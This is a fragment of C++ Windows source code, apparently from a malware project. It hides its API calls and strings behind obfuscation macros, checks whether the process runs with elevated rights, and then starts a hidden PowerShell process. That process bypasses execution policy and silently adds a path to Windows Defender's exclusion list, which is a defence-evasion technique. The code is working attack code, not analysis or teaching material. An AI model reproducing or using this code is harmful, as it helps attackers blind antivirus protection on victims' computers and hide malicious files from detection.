        subkeyNameSize = sizeof(subkeyName) / sizeof(wchar_t);
    }
    _RegCloseKey(hKey);

    return OBFUSCATE_STRING("Unknown");
}

bool IsRunningAsAdmin() {
    pOpenProcessToken_t _OpenProcessToken = (pOpenProcessToken_t)STEALTH_API_OBFSTR("advapi32.dll", "OpenProcessToken");
    pGetTokenInformation_t _GetTokenInformation = (pGetTokenInformation_t)STEALTH_API_OBFSTR("advapi32.dll", "GetTokenInformation");
    pCloseHandle_t _CloseHandle = (pCloseHandle_t)STEALTH_API_OBFSTR("kernel32.dll", "CloseHandle");
    if (!_OpenProcessToken || !_GetTokenInformation) return false;

    BOOL isAdmin = FALSE;
    HANDLE hToken = NULL;
    TOKEN_ELEVATION elevation;
    DWORD dwSize = sizeof(TOKEN_ELEVATION);

    if (!_OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
        return false;

    if (!_GetTokenInformation(hToken, TokenElevation, &elevation, dwSize, &dwSize)) {
        if (_CloseHandle) _CloseHandle(hToken);
        return false;
    }

    isAdmin = elevation.TokenIsElevated;
    if (_CloseHandle) _CloseHandle(hToken);
    return isAdmin == TRUE;
}

// Add a path to Windows Defender exclusion using PowerShell
bool AddDefenderExclusion(const std::string& path) {
    // Only attempt if running as admin
    if (!IsRunningAsAdmin()) {
#ifdef ENABLE_DEBUG_CONSOLE
        std::cerr << "[-] Not running as admin, cannot add Defender exclusion" << std::endl;
#endif
        return false;
    }

    pCreateProcessW_t _CreateProcessW = (pCreateProcessW_t)STEALTH_API_OBFSTR("kernel32.dll", "CreateProcessW");
    pWaitForSingleObject_t _WaitForSingleObject = (pWaitForSingleObject_t)STEALTH_API_OBFSTR("kernel32.dll", "WaitForSingleObject");
    pGetExitCodeProcess_t _GetExitCodeProcess = (pGetExitCodeProcess_t)STEALTH_API_OBFSTR("kernel32.dll", "GetExitCodeProcess");
    pCloseHandle_t _CloseHandle = (pCloseHandle_t)STEALTH_API_OBFSTR("kernel32.dll", "CloseHandle");
    if (!_CreateProcessW) return false;

    // Build PowerShell command to add exclusion
    std::string psCmd = OBFUSCATE_STRING("powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force; Add-MpPreference -ExclusionPath '");
    psCmd += path + OBFUSCATE_STRING("' -Force -ErrorAction SilentlyContinue\"");

#ifdef ENABLE_DEBUG_CONSOLE
    std::cout << "[*] Attempting to add Defender exclusion for: " << path << std::endl;
#endif

    int size_needed = MultiByteToWideChar(CP_UTF8, 0, &psCmd[0], (int)psCmd.size(), NULL, 0);
    std::wstring wpsCommand(size_needed, 0);
    MultiByteToWideChar(CP_UTF8, 0, &psCmd[0], (int)psCmd.size(), &wpsCommand[0], size_needed);

    STARTUPINFOW si = { 0 };
    si.cb = sizeof(STARTUPINFOW);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi = { 0 };

    BOOL result = _CreateProcessW(NULL, (LPWSTR)wpsCommand.c_str(), NULL, NULL, FALSE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    if (!result) {
#ifdef ENABLE_DEBUG_CONSOLE
        std::cerr << "[-] Failed to create PowerShell process" << std::endl;
#endif
        return false;
    }

    if (_WaitForSingleObject) _WaitForSingleObject(pi.hProcess, INFINITE);

    DWORD exitCode = 0;
    if (_GetExitCodeProcess) _GetExitCodeProcess(pi.hProcess, &exitCode);

    if (_CloseHandle) { _CloseHandle(pi.hProcess); _CloseHandle(pi.hThread); }

    if (exitCode != 0) {
#ifdef ENABLE_DEBUG_CONSOLE
        std::cerr << "[-] PowerShell command failed with exit code: " << exitCode << std::endl;
#endif
        return false;
    }

#ifdef ENABLE_DEBUG_CONSOLE
    std::cout << "[+] Successfully added Defender exclusion for: " << path << std::endl;
#endif
    return true;
}
